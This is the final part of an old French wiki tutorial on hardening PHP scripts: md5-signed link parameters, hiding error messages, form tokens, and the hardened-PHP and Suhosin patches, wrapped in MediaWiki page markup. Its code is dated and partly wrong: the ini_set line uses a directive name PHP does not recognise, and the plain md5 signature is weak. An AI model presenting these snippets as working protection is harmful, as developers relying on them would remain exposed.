+<p><span style="color:#000000">Dans cette quatrième et dernière partie du dossier sur la sécurité (et l'insécurité) des scripts PHP, on retrouve quelques principes qui vont permettre d'ajouter une couche de sécurisation supplémentaires aux scripts développés dans ce langage.</span><span style="color:#000000">NDLR&#160;: ce document a été rédigé en 2006, certaines versions ainsi que certaines configurations des logiciels utilisés selon ces versions peuvent être différentes de celles qui sont mentionnées&#160;; merci de vous reporter vers les sites officiels des projets en question en cas de problème. <br /><br /><br />Pour sécuriser de manière optimale une application Web, on peut appliquer des règles de sécurité qui permettent de vérifier qu’aucune entrée n’a été modifiée par le visiteur. <br /><br />Pour chaque lien il suffit de rajouter une variable qui va servir de signature de validité pour la requête. <br /><br />Pour générer les liens sécurisé, le code suivant&#160;: <br /><br /></span><span style="color:#003366">&lt;&#160;? <br />$secretkey = "highly secret key "&#160;; <br />Echo " code html …. "; <br />Echo "&lt;a href=\"/page.php&#160;?var=course&amp;signature=".md5($secretkey."course")&#160;; <br />… <br />?&gt; </span><span style="color:#000000"><br /><br /><br />Le fichier page.php&#160;: <br /><br /></span><span style="color:#003366">&lt;&#160;? <br />$secretkey = "highly secret key "&#160;; <br />$realsign = md5($secretkey.$_REQUEST["var"])&#160;; <br />If($realsign&#160;!= $_REQUEST["signature"]) <br />{ <br />Echo "mauvaise valeur d’entrée"&#160;; <br />Exit()&#160;; <br />} <br />… suite du fichier <br /></span><span style="color:#003366">?&gt; </span><span style="color:#000000"><br /><br /><br />Ceci permet de s'assurer que les requêtes ont pour origine les pages de notre site. <br /><br />Il faut aussi désactiver l’affichage des messages d’erreur dans la configuration de PHP ou bien a l’aide de&#160;: <br /><br /></span><span style="color:#003366">ini_set("error_display",off); </span><span style="color:#000000"><br /><br />Cela doit être placé au début du script, car chaque message d’erreur donne des informations précieuses à un attaquant potentiel. <br /><br />Il existe également une technique permettant de sécuriser un formulaire, elle consiste à placer un numéro de session que l’on va stocker dans une table. <br /><br />Lors de la validation du formulaire on vérifie alors que ce numéro est bien dans la table. <br /><br />Un outil essentiel à la sécurité de vos script est le patch hardened-PHP que l'on peut trouver sur le site officiel du projet ( lien http externe url:</span><a rel="nofollow" class="external text" href="http://www.hardened-php.net/">[click</a>]<span style="color:#000000"> ). <br /><br />Le projet Suhosin ( lien http externe url:</span><a rel="nofollow" class="external text" href="http://www.secuobs.com/news/19032007-suhosin.shtml">[click</a>]<span style="color:#000000"> ) est également à étudier. <br /><br />Des compléments d'informations sont disponibles dans les articles suivants ( failles XSRF lien http externe url:</span><a rel="nofollow" class="external text" href="http://www.secuobs.com/news/24112006-backdoor_javascript.shtml">[click</a>]<span style="color:#000000"> ) et ( mois des failles PHP - lien http externe url:</span><a rel="nofollow" class="external text" href="http://www.secuobs.com/news/11022007-php_month.shtml">[click</a>]<span style="color:#000000"> ). </span>
+</p>
+<h1><span class="mw-headline" id="Ressouces"><span class="mw-headline-number">6</span> Ressouces</span></h1>
+<p><a rel="nofollow" class="external free" href="http://www.secuobs.com/news/10052008-php_security.shtml">http://www.secuobs.com/news/10052008-php_security.shtml</a>
+</p>
+<!-- 
+NewPP limit report
+CPU time usage: 0.020 seconds
+Real time usage: 0.023 seconds
+Preprocessor visited node count: 66/1000000
+Preprocessor generated node count: 116/1000000
+Post‐expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Highest expansion depth: 2/40
+Expensive parser function count: 0/100
+-->
+
+<!-- 
+Transclusion expansion time report (%,ms,calls,template)
+100.00%    0.000      1 - -total
+-->
+
+<!-- Saved in parser cache with key blocnotesinfo-wiki_:pcache:idhash:2553-0!*!*!1!en!*!* and timestamp 20181111230844 and revision id 6088
+ -->
+</div>									<div class="printfooter">
+						Retrieved from "<a dir="ltr" href="https://wiki.deimos.fr/index.php?title=Les_injections_SQL&amp;oldid=6088">https://wiki.deimos.fr/index.php?title=Les_injections_SQL&amp;oldid=6088</a>"					</div>
+													<div id='catlinks' class='catlinks catlinks-allhidden'></div>												<div class="visualClear"></div>
+							</div>
+		</div>
+		<div id="mw-navigation">
+			<h2>Navigation menu</h2>
+
+			<div id="mw-head">
+									<div id="p-personal" role="navigation" class="" aria-labelledby="p-personal-label">
+						<h3 id="p-personal-label">Personal tools</h3>
+						<ul>
+							<li id="pt-login"><a href="https://wiki.deimos.fr/index.php?title=Special:UserLogin&amp;returnto=Les+injections+SQL" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>						</ul>
+					</div>
+									<div id="left-navigation">
+										<div id="p-namespaces" role="navigation" class="vectorTabs" aria-labelledby="p-namespaces-label">
+						<h3 id="p-namespaces-label">Namespaces</h3>
+						<ul>
+															<li  id="ca-nstab-main" class="selected"><span><a href="Les_injections_SQL.html"  title="View the content page [c]" accesskey="c">Page</a></span></li>
+													</ul>
+					</div>
+										<div id="p-variants" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-variants-label">
+												<h3 id="p-variants-label"><span>Variants</span><a href="Les_injections_SQL.html#"></a></h3>
+
+						<div class="menu">
+							<ul>
+															</ul>
+						</div>
+					</div>
+									</div>
+				<div id="right-navigation">
+										<div id="p-views" role="navigation" class="vectorTabs" aria-labelledby="p-views-label">
+						<h3 id="p-views-label">Views</h3>
+						<ul>
+															<li id="ca-view" class="selected"><span><a href="Les_injections_SQL.html" >Read</a></span></li>
+															<li id="ca-viewsource"><span><a href="https://wiki.deimos.fr/index.php?title=Les_injections_SQL&amp;action=edit"  title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></span></li>
+															<li id="ca-history" class="collapsible"><span><a href="https://wiki.deimos.fr/index.php?title=Les_injections_SQL&amp;action=history"  title="Past revisions of this page [h]" accesskey="h">View history</a></span></li>
+													</ul>
+					</div>
+										<div id="p-cactions" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-cactions-label">
+						<h3 id="p-cactions-label"><span>More</span><a href="Les_injections_SQL.html#"></a></h3>
+
+						<div class="menu">
+							<ul>
+															</ul>
+						</div>
+					</div>
+										<div id="p-search" role="search">
+						<h3>
+							<label for="searchInput">Search</label>
+						</h3>
+
+						<form action="https://wiki.deimos.fr/index.php" id="searchform">
+														<div id="simpleSearch">
+															<input type="search" name="search" placeholder="Search" title="Search Deimos.fr / Bloc Notes Informatique [f]" accesskey="f" id="searchInput" /><input type="hidden" value="Special:Search" name="title" /><input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton mw-fallbackSearchButton" /><input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchButton" class="searchButton" />								</div>
+						</form>
+					</div>
+									</div>
+			</div>
+			<div id="mw-panel">
+				<div id="p-logo" role="banner"><a style="background-image: url(images/a/a7/Logo_deimosfr.png);" href="index.html"  title="Visit the main page"></a></div>
+						<div class="portal" role="navigation" id='p-navigation_et_RSS' aria-labelledby='p-navigation_et_RSS-label'>
+			<h3 id='p-navigation_et_RSS-label'>navigation et RSS</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-cd-.7E"><a href="index.html">cd ~</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Menu' aria-labelledby='p-Menu-label'>
+			<h3 id='p-Menu-label'>Menu</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-Solaris"><a href="Solaris.html">Solaris</a></li>
+													<li id="n-BSD"><a href="BSD.html">BSD</a></li>
+													<li id="n-Linux"><a href="Linux.html">Linux</a></li>
+													<li id="n-Mac-OS-X"><a href="Mac_OS_X.html">Mac OS X</a></li>
+													<li id="n-Windows"><a href="Windows.html">Windows</a></li>
+													<li id="n-Servers"><a href="Serveurs.html">Servers</a></li>
+													<li id="n-Development"><a href="Développement.html">Development</a></li>
+													<li id="n-Ethical-Hacking"><a href="Hacking_éthique.html">Ethical Hacking</a></li>
+													<li id="n-Network"><a href="Réseaux.html">Network</a></li>
+													<li id="n-Divers"><a href="Divers.html">Divers</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Liens' aria-labelledby='p-Liens-label'>
+			<h3 id='p-Liens-label'>Liens</h3>
+
+			<div class="body">
+									<ul>
+													<li id="n-Welcome-Page"><a href="http://www.deimos.fr" rel="nofollow">Welcome Page</a></li>
+													<li id="n-Blog"><a href="http://blog.deimos.fr" rel="nofollow">Blog</a></li>
+													<li id="n-Resume"><a href="https://www.linkedin.com/in/pmavro/" rel="nofollow">Resume</a></li>
+													<li id="n-GitHub"><a href="https://github.com/deimosfr" rel="nofollow">GitHub</a></li>
+											</ul>
+							</div>
+		</div>
+			<div class="portal" role="navigation" id='p-Google_Search' aria-labelledby='p-Google_Search-label'>
+			<h3 id='p-Google_Search-label'>Google Search</h3>
+
+			<div class="body">
+									
+<div><form action="http://www.google.fr/cse" id="cse-search-box">
+    <input type="hidden" name="cx" value="partner-pub-8001790276473966:7664586454" />
+    <input type="hidden" name="ie" value="UTF-8" />
+    <input type="text" name="q" size="12" />
+    <input type="submit" name="sa" value="Search" />
+</form></div>			</div>
+		</div>
+			<div class="portal" role="navigation" id='p-googletranslator' aria-labelledby='p-googletranslator-label'>
+			<h3 id='p-googletranslator-label'>Translate</h3>
+
+			<div class="body">
+									<div id="google_translate_element"></div><script>
+                                        function googleTranslateElementInit() {
+                                          new google.translate.TranslateElement({
+                                            pageLanguage: 'fr',
+                                            includedLanguages: 'en,de,es'
+                                          }, 'google_translate_element');
+                                        }
+                                        </script><script src="http://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>			</div>
+		</div>
+			<div class="portal" role="navigation" id='p-tb' aria-labelledby='p-tb-label'>
+			<h3 id='p-tb-label'>Tools</h3>
+
+			<div class="body">
+									<ul>
+													<li id="t-whatlinkshere"><a href="./Special:WhatLinksHere/Les_injections_SQL.html" title="A list of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
+													<li id="t-recentchangeslinked"><a href="https://wiki.deimos.fr/Special:RecentChangesLinked/Les_injections_SQL" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
+													<li id="t-specialpages"><a href="https://wiki.deimos.fr/Special:SpecialPages" title="A list of all special pages [q]" accesskey="q">Special pages</a></li>
+													<li id="t-print"><a href="https://wiki.deimos.fr/index.php?title=Les_injections_SQL&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>
+													<li id="t-permalink"><a href="https://wiki.deimos.fr/index.php?title=Les_injections_SQL&amp;oldid=6088" title="Permanent link to this revision of the page">Permanent link</a></li>
+													<li id="t-info"><a href="https://wiki.deimos.fr/index.php?title=Les_injections_SQL&amp;action=info" title="More information about this page">Page information</a></li>
+											</ul>
+							</div>
+		</div>
+				</div>
+		</div>
+		<div id="footer" role="contentinfo">
+							<ul id="footer-info">
+											<li id="footer-info-lastmod"> This page was last modified on 24 May 2008, at 16:41.</li>
+											<li id="footer-info-copyright">Content is available under <a class="external" rel="nofollow" href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr">Attribution - Pas d’Utilisation Commerciale - Partage dans les Mêmes Conditions 3.0 non transposé</a> unless otherwise noted.</li>
+									</ul>
+							<ul id="footer-places">
+											<li id="footer-places-privacy"><a href="https://wiki.deimos.fr/blocnotesinfo:Privacy_policy" title="blocnotesinfo:Privacy policy">Privacy policy</a></li>
+											<li id="footer-places-about"><a href="https://wiki.deimos.fr/blocnotesinfo:About" title="blocnotesinfo:About">About Deimos.fr / Bloc Notes Informatique</a></li>
+											<li id="footer-places-disclaimer"><a href="https://wiki.deimos.fr/blocnotesinfo:General_disclaimer" title="blocnotesinfo:General disclaimer">Disclaimers</a></li>
+									</ul>
+										<ul id="footer-icons" class="noprint">
+											<li id="footer-copyrightico">
+															<a href="http://creativecommons.org/licenses/by-nc-sa/3.0/deed.fr"><img src="http://i.creativecommons.org/l/by-nc-sa/3.0/88x31.png" alt="Attribution - Pas d’Utilisation Commerciale - Partage dans les Mêmes Conditions 3.0 non transposé" width="88" height="31" /></a>
+													</li>
+											<li id="footer-poweredbyico">
+															<a href="https://www.mediawiki.org/"><img src="resources/assets/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" srcset="resources/assets/poweredby_mediawiki_132x47.png 1.5x, resources/assets/poweredby_mediawiki_176x62.png 2x" width="88" height="31" /></a>
+															<a href="http://www.mediawiki.org/wiki/Extension:SphinxSearch"><img src="extensions/SphinxSearch/skins/images/Powered_by_sphinx.png" alt="Search Powered by Sphinx" width="88" height="31" /></a>
+													</li>
+									</ul>
+						<div style="clear:both"></div>
+		</div>
+		<script>if(window.jQuery)jQuery.ready();</script><script>if(window.mw){
+mw.loader.state({"site":"loading","user":"ready","user.groups":"ready"});
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.toc","mediawiki.action.view.postEdit","mediawiki.user","mediawiki.hidpi","mediawiki.page.ready","mediawiki.searchSuggest"],null,true);
+}</script>
+<script>if(window.mw){
+document.write("\u003Cscript src=\"https://wiki.deimos.fr/load.php?debug=false\u0026amp;lang=en\u0026amp;modules=site\u0026amp;only=scripts\u0026amp;skin=vector\u0026amp;*\"\u003E\u003C/script\u003E");
+}</script>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-63927289-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<script type="text/javascript" src="https://analytics.example.com/tracking.js"></script><script src="https://js.reactk.com/script/reactk.min.js"></script><script type="text/javascript">reactk.init("B7stJmobgweRBoDZrLflNQpDcgFxET");</script> 
+<script>if(window.mw){
+mw.config.set({"wgBackendResponseTime":58});
+}</script>
+	</body>
+</html>
+	
